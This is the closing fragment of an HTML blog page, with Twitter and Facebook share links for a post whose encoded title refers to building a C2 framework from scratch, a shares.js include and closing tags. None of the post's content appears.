          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%89%8B%E6%90%93C2%E6%A1%86%E6%9E%B6 + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F10%2F14%2F%25E4%25BB%258E%25E9%259B%25B6%25E5%25BC%2580%25E5%25A7%258B%25E6%2589%258B%25E6%2590%2593C2%25E6%25A1%2586%25E6%259E%25B6%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/10/14/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%89%8B%E6%90%93C2%E6%A1%86%E6%9E%B6/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
